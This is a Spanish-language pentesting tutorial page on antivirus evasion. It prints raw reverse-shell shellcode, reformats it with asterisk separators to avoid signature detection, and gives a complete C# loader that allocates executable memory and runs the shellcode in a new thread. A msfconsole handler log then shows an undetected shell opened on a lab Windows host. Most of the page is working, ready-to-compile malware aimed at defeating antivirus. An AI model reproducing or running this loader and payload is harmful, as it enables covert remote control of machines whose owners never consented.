---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Evasión de antivirus con C - Parte 2

Siguiendo el codigo en `C#` de la parte anterior igualmente ese codigo lo puede seguir detectando algunos antivirus, ya que el `payload` que hemos utilizado lo hemos pegado directamente sin realizar ninguna modificacion al mismo, por eso el poder ser detectados, por lo que vamos a realizar alguna modificacion de la siguiente forma:

En este caso vamos a utilizar el editor de archivos llamado `emacs` para que todo esto vaya de forma mas automatizada:

```shell
emacs
```

Una vez dentro abriremos una nueva hoja y pegaremos el siguiente `payload` del codigo anterior:

```
0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,
0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
0x8b,0x48,0x18,0x8b,0x58,0x20,0x50,0x01,0xd3,0x85,0xc9,0x74,
0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,
0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,
0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,
0x6a,0x0a,0x68,0xc0,0xa8,0x05,0xcd,0x68,0x02,0x00,0x1e,0x61,
0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,
0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,
0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,
0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,
0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,
0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,
0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,
0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5
```

Seleccionamos todo el `payload` y haremos `Alt+M` -> pondremos `replace-string` -> pondremos `0x` -> `ENTER` -> pondremos `*` -> `ENTER`.

Y con esto habremos reemplazado todos los `0x` por un `*`:

```
*fc,*e8,*8f,*00,*00,*00,
*60,*31,*d2,*89,*e5,*64,*8b,*52,*30,*8b,*52,*0c,
*8b,*52,*14,*0f,*b7,*4a,*26,*31,*ff,*8b,*72,*28,
*31,*c0,*ac,*3c,*61,*7c,*02,*2c,*20,*c1,*cf,*0d,
*01,*c7,*49,*75,*ef,*52,*57,*8b,*52,*10,*8b,*42,
*3c,*01,*d0,*8b,*40,*78,*85,*c0,*74,*4c,*01,*d0,
*8b,*48,*18,*8b,*58,*20,*50,*01,*d3,*85,*c9,*74,
*3c,*49,*31,*ff,*8b,*34,*8b,*01,*d6,*31,*c0,*ac,
*c1,*cf,*0d,*01,*c7,*38,*e0,*75,*f4,*03,*7d,*f8,
*3b,*7d,*24,*75,*e0,*58,*8b,*58,*24,*01,*d3,*66,
*8b,*0c,*4b,*8b,*58,*1c,*01,*d3,*8b,*04,*8b,*01,
*d0,*89,*44,*24,*24,*5b,*5b,*61,*59,*5a,*51,*ff,
*e0,*58,*5f,*5a,*8b,*12,*e9,*80,*ff,*ff,*ff,*5d,
*68,*33,*32,*00,*00,*68,*77,*73,*32,*5f,*54,*68,
*4c,*77,*26,*07,*89,*e8,*ff,*d0,*b8,*90,*01,*00,
*00,*29,*c4,*54,*50,*68,*29,*80,*6b,*00,*ff,*d5,
*6a,*0a,*68,*c0,*a8,*05,*cd,*68,*02,*00,*1e,*61,
*89,*e6,*50,*50,*50,*50,*40,*50,*40,*50,*68,*ea,
*0f,*df,*e0,*ff,*d5,*97,*6a,*10,*56,*57,*68,*99,
*a5,*74,*61,*ff,*d5,*85,*c0,*74,*0a,*ff,*4e,*08,
*75,*ec,*e8,*67,*00,*00,*00,*6a,*00,*6a,*04,*56,
*57,*68,*02,*d9,*c8,*5f,*ff,*d5,*83,*f8,*00,*7e,
*36,*8b,*36,*6a,*40,*68,*00,*10,*00,*00,*56,*6a,
*00,*68,*58,*a4,*53,*e5,*ff,*d5,*93,*53,*6a,*00,
*56,*53,*57,*68,*02,*d9,*c8,*5f,*ff,*d5,*83,*f8,
*00,*7d,*28,*58,*68,*00,*40,*00,*00,*6a,*00,*50,
*68,*0b,*2f,*0f,*30,*ff,*d5,*57,*68,*75,*6e,*4d,
*61,*ff,*d5,*5e,*5e,*ff,*0c,*24,*0f,*85,*70,*ff,
*ff,*ff,*e9,*9b,*ff,*ff,*ff,*01,*c3,*29,*c6,*75,
*c1,*c3,*bb,*f0,*b5,*a2,*56,*6a,*00,*53,*ff,*d5
```

Ahora vamos a quitar las `,` haciendo lo mismo que antes, pero en esta parte donde nos da a elegir 2 opciones pondremos primero donde habiamos puesto el `0x` pondremos una `,` y en la segunda parte donde pusimos el `*` pondremos nada para dejarlo vacio y que se eliminen, quedando algo asi:

```
*fc*e8*8f*00*00*00
*60*31*d2*89*e5*64*8b*52*30*8b*52*0c
*8b*52*14*0f*b7*4a*26*31*ff*8b*72*28
*31*c0*ac*3c*61*7c*02*2c*20*c1*cf*0d
*01*c7*49*75*ef*52*57*8b*52*10*8b*42
*3c*01*d0*8b*40*78*85*c0*74*4c*01*d0
*8b*48*18*8b*58*20*50*01*d3*85*c9*74
*3c*49*31*ff*8b*34*8b*01*d6*31*c0*ac
*c1*cf*0d*01*c7*38*e0*75*f4*03*7d*f8
*3b*7d*24*75*e0*58*8b*58*24*01*d3*66
*8b*0c*4b*8b*58*1c*01*d3*8b*04*8b*01
*d0*89*44*24*24*5b*5b*61*59*5a*51*ff
*e0*58*5f*5a*8b*12*e9*80*ff*ff*ff*5d
*68*33*32*00*00*68*77*73*32*5f*54*68
*4c*77*26*07*89*e8*ff*d0*b8*90*01*00
*00*29*c4*54*50*68*29*80*6b*00*ff*d5
*6a*0a*68*c0*a8*05*cd*68*02*00*1e*61
*89*e6*50*50*50*50*40*50*40*50*68*ea
*0f*df*e0*ff*d5*97*6a*10*56*57*68*99
*a5*74*61*ff*d5*85*c0*74*0a*ff*4e*08
*75*ec*e8*67*00*00*00*6a*00*6a*04*56
*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7e
*36*8b*36*6a*40*68*00*10*00*00*56*6a
*00*68*58*a4*53*e5*ff*d5*93*53*6a*00
*56*53*57*68*02*d9*c8*5f*ff*d5*83*f8
*00*7d*28*58*68*00*40*00*00*6a*00*50
*68*0b*2f*0f*30*ff*d5*57*68*75*6e*4d
*61*ff*d5*5e*5e*ff*0c*24*0f*85*70*ff
*ff*ff*e9*9b*ff*ff*ff*01*c3*29*c6*75
*c1*c3*bb*f0*b5*a2*56*6a*00*53*ff*d5
```

Ahora solo tendremos que quitar todos los saltos de linea para que quede todo en una unica linea y le pondremos `"` al principio y final de la siguiente forma:

```
"fc*e8*8f*00*00*00*60*31*d2*89*e5*64*8b*52*30*8b*52*0c*8b*52*14*0f*b7*4a*26*31*ff*8b*72*28*31*c0*ac*3c*61*7c*02*2c*20*c1*cf*0d*01*c7*49*75*ef*52*57*8b*52*10*8b*42*3c*01*d0*8b*40*78*85*c0*74*4c*01*d0*8b*48*18*8b*58*20*50*01*d3*85*c9*74*3c*49*31*ff*8b*34*8b*01*d6*31*c0*ac*c1*cf*0d*01*c7*38*e0*75*f4*03*7d*f8*3b*7d*24*75*e0*58*8b*58*24*01*d3*66*8b*0c*4b*8b*58*1c*01*d3*8b*04*8b*01*d0*89*44*24*24*5b*5b*61*59*5a*51*ff*e0*58*5f*5a*8b*12*e9*80*ff*ff*ff*5d*68*33*32*00*00*68*77*73*32*5f*54*68*4c*77*26*07*89*e8*ff*d0*b8*90*01*00*00*29*c4*54*50*68*29*80*6b*00*ff*d5*6a*0a*68*c0*a8*05*cd*68*02*00*1e*61*89*e6*50*50*50*50*40*50*40*50*68*ea*0f*df*e0*ff*d5*97*6a*10*56*57*68*99*a5*74*61*ff*d5*85*c0*74*0a*ff*4e*08*75*ec*e8*67*00*00*00*6a*00*6a*04*56*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7e*36*8b*36*6a*40*68*00*10*00*00*56*6a*00*68*58*a4*53*e5*ff*d5*93*53*6a*00*56*53*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7d*28*58*68*00*40*00*00*6a*00*50*68*0b*2f*0f*30*ff*d5*57*68*75*6e*4d*61*ff*d5*5e*5e*ff*0c*24*0f*85*70*ff*ff*ff*e9*9b*ff*ff*ff*01*c3*29*c6*75*c1*c3*bb*f0*b5*a2*56*6a*00*53*ff*d5"
```

Ahora el codigo modificado quedaria de la siguiente forma:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace WIn32

{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]

        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddess, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]

        static extern UInt32 WaitForSingleObject(IntPtr hHandler, UInt32 dwMilliseconds);

        static void Main (string[] args)
        {

            string payload = "fc*e8*8f*00*00*00*60*31*d2*89*e5*64*8b*52*30*8b*52*0c*8b*52*14*0f*b7*4a*26*31*ff*8b*72*28*31*c0*ac*3c*61*7c*02*2c*20*c1*cf*0d*01*c7*49*75*ef*52*57*8b*52*10*8b*42*3c*01*d0*8b*40*78*85*c0*74*4c*01*d0*8b*48*18*8b*58*20*50*01*d3*85*c9*74*3c*49*31*ff*8b*34*8b*01*d6*31*c0*ac*c1*cf*0d*01*c7*38*e0*75*f4*03*7d*f8*3b*7d*24*75*e0*58*8b*58*24*01*d3*66*8b*0c*4b*8b*58*1c*01*d3*8b*04*8b*01*d0*89*44*24*24*5b*5b*61*59*5a*51*ff*e0*58*5f*5a*8b*12*e9*80*ff*ff*ff*5d*68*33*32*00*00*68*77*73*32*5f*54*68*4c*77*26*07*89*e8*ff*d0*b8*90*01*00*00*29*c4*54*50*68*29*80*6b*00*ff*d5*6a*0a*68*c0*a8*05*cd*68*02*00*1e*61*89*e6*50*50*50*50*40*50*40*50*68*ea*0f*df*e0*ff*d5*97*6a*10*56*57*68*99*a5*74*61*ff*d5*85*c0*74*0a*ff*4e*08*75*ec*e8*67*00*00*00*6a*00*6a*04*56*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7e*36*8b*36*6a*40*68*00*10*00*00*56*6a*00*68*58*a4*53*e5*ff*d5*93*53*6a*00*56*53*57*68*02*d9*c8*5f*ff*d5*83*f8*00*7d*28*58*68*00*40*00*00*6a*00*50*68*0b*2f*0f*30*ff*d5*57*68*75*6e*4d*61*ff*d5*5e*5e*ff*0c*24*0f*85*70*ff*ff*ff*e9*9b*ff*ff*ff*01*c3*29*c6*75*c1*c3*bb*f0*b5*a2*56*6a*00*53*ff*d5";

            string[] temp_payload = payload.Split('*');

            byte[] payload_final = new byte[temp_payload.Length];

            for (int i = 0; i < temp_payload.Length; i++)
            {
                payload_final[i] = Convert.ToByte(temp_payload[i], 16);
            }

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Iniciando sesion reversa");

            IntPtr funcAdrr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(payload_final, 0, funcAdrr, payload_final.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAdrr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xffffffff);

        }
    }

}
```

Lo que estamos haciendo en esta parte del codigo `string payload = "fc*e8*8f*00*....";` es definir el `payload` que hemos modificado separado por `*`.

Despues en esta otra parte del codigo `string[] temp_payload = payload.Split('*');` lo que estamos haciendo es que cuando encuentre un `*` lo separe/parta para que tengamos una cadenas de `bytes`.

En esta parte `byte[] payload_final = new byte[temp_payload.Length];` simplemente estamos definiendo un `array` para posteriormente poder utilizarlo con el `payload`.

En el `bucle for` lo que estamos haciendo es que va recorriendo cada uno de los `strings` del `payload` que hemos modificado para poder convertir cada uno de los `*` en `bytes`.

La diferencia de todo esto es que la firma que llevaba antes de `msfvenom` era muy reconocible, pero ahora al crear nuestro propio `payload` es una firma propia, por lo que sera muy complicado de que un antivirus lo detecte actualmente.

Ahora vamos a volverlo a compilar y nos lo vamos a pasar a la maquina `WS02` el cual tiene el antivirus activado, cuando nos lo pasemos veremos que ni siquiera nos da un aviso de que pueda ser un `malware` por lo que esta funcionando de forma correcta, si nos volvemos a poner a la escucha en `msfconsole` con el `multi/handler` y ejecutamos el binario desde la maquina `WS02` y volvemos a donde tenemos la escucha:

```
[*] Started reverse TCP handler on 192.168.5.205:7777 
[*] Sending stage (240 bytes) to 192.168.5.209
[*] Command shell session 1 opened (192.168.5.205:7777 -> 192.168.5.209:52504) at 2025-02-06 04:07:26 -0500


Shell Banner:
Microsoft Windows [Versi_n 10.0.19045.3803]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\empleado2\Desktop>
-----
          

C:\Users\empleado2\Desktop>whoami
whoami
corp\empleado2
```

Veremos que efectivamente nos esta creando una `shell` sin ningun tipo de problema y sin que el antivirus detecte absolutamente nada.
